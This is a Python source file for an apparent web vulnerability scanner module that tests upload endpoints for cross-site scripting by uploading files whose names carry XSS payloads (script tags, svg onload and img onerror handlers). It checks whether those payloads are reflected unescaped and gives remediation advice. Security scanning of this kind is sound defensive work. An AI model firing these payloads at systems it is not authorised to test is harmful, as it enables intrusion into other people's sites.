"""xss_via_filename_upload — XSS via uploaded file's filename reflection.

Apps that echo back filenames after upload ("File 'X' uploaded
successfully") are XSS-vulnerable if filenames are not escaped.
Attacker uploads file named: pwn"><script>alert(1)</script>.txt

POST to common upload endpoints with payload-in-filename. If response
body contains the unescaped <script> tag, BUG.
"""
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)
from tools._vl_core.turbo import vl_turbo

router = APIRouter()

UPLOAD_PATHS = ["/upload", "/api/upload", "/api/v1/upload",
                 "/api/file", "/file/upload", "/api/import"]
PAYLOAD_FILENAMES = [
    'vulnuslab"><script>alert(1)</script>.txt',
    "vulnuslab'<svg onload=alert(1)>.png",
    "vulnuslab<img src=x onerror=alert(1)>.pdf",
]


def _upload(url, filename, req):
    """POST multipart with a benign body but evil filename."""
    boundary = "----vulnuslab-boundary-9999"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        "Content-Type: text/plain\r\n\r\n"
        "vulnuslab-test-content\r\n"
        f"--{boundary}--\r\n"
    )
    return safe_request("POST", url,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}",
                  "User-Agent": "VulnusLab/1.0"},
        data=body, req=req, timeout=10, allow_redirects=False)


@router.post("/api/webapp/scan/xss_via_filename_upload")
@vl_turbo()
def scan_xss_via_filename_upload(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")
    xss_hits = []
    tested = 0

    for path in UPLOAD_PATHS:
        url = base + path
        # Skip non-existent
        r0 = safe_request("GET", url,
            headers={"User-Agent": "VulnusLab/1.0"},
            req=req, timeout=6, allow_redirects=False)
        if r0 is None or r0.status_code == 404: continue
        tested += 1

        for fn in PAYLOAD_FILENAMES:
            r = _upload(url, fn, req)
            if r is None: continue
            body = (r.text or "")[:10000]
            # XSS signal: payload reflected UNESCAPED in body
            if "<script>alert(1)" in body or "onerror=alert(1)" in body or "onload=alert(1)" in body:
                xss_hits.append({"path": path, "filename": fn[:60],
                                   "status": r.status_code})
                break  # one finding per path

    findings = []
    if xss_hits:
        findings.append(wrap_finding(
            f"XSS via uploaded filename at {len(xss_hits)} endpoint(s)",
            "HIGH", cvss="7.5", cwe="CWE-79", owasp="A03:2021",
            remediation="HTML-escape filename BEFORE echoing in response. Most "
                        "templating engines auto-escape (Jinja2, Twig, Razor) — "
                        "bug is usually in raw string concatenation. Better: "
                        "rename uploaded files to UUID + store original name in "
                        "DB as text-only (no HTML render).",
            evidence_marker=" | ".join(
                f"{h['path']}: {h['filename']} reflected unescaped"
                for h in xss_hits[:3]
            )))
    elif tested > 0:
        findings.append(wrap_finding(
            f"Filename XSS rejected at {tested} upload endpoint(s)",
            "POSITIVE", cwe="CWE-79",
            remediation="Maintain. Continue escaping user-controlled filenames.",
            evidence_marker=f"{tested} upload endpoints × {len(PAYLOAD_FILENAMES)} payloads"))
    else:
        return standard_response(
            tool="xss_via_filename_upload", target=req.target, findings=[],
            tests_performed=len(UPLOAD_PATHS), vulnerable=False,
            skipped_reason="No upload endpoints found")

    return standard_response(
        tool="xss_via_filename_upload", target=req.target, findings=findings,
        tests_performed=tested * len(PAYLOAD_FILENAMES),
        vulnerable=bool(xss_hits),
        tests_summary=f"{tested} upload endpoints, {len(xss_hits)} XSS",
        raw_data={"xss_hits": xss_hits})


def register(app):
    app.include_router(router)
